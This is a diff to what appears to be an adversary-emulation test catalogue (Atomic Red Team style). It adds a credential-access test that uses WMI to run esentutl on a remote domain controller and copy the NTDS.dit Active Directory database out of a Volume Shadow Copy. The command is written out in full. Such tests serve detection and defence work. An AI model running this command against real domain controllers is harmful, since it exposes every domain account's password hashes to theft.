@@ -4404,6 +4404,45 @@ credential-access:
 '
         name: command_prompt
         elevation_required: true
+    - name: Create Volume Shadow Copy remotely (WMI) with esentutl
+      auto_generated_guid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
+      description: |
+        This test is intended to be run from a remote workstation with domain admin context.
+        The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
+      supported_platforms:
+      - windows
+      input_arguments:
+        source_path:
+          description: File to shadow copy
+          type: String
+          default: c:\windows\ntds\ntds.dit
+        target_path:
+          description: Target path of the result file
+          type: String
+          default: c:\ntds.dit
+        target_host:
+          description: IP Address / Hostname you want to target
+          type: String
+          default: localhost
+      dependencies:
+      - description: 'Target must be a reachable Domain Controller, and current context
+          must be domain admin
+
+'
+        prereq_command: 'wmic /node:"#{target_host}" shadowcopy list brief
+
+'
+        get_prereq_command: 'echo Sorry, can''t connect to target host, check: network,
+          firewall or permissions (must be admin on target)
+
+'
+      executor:
+        command: 'wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe
+          /y /vss #{source_path} /d #{target_path}"
+
+'
+        name: command_prompt
+        elevation_required: true
     - name: Create Volume Shadow Copy with Powershell
       auto_generated_guid: 542bb97e-da53-436b-8e43-e0a7d31a6c24
       description: |
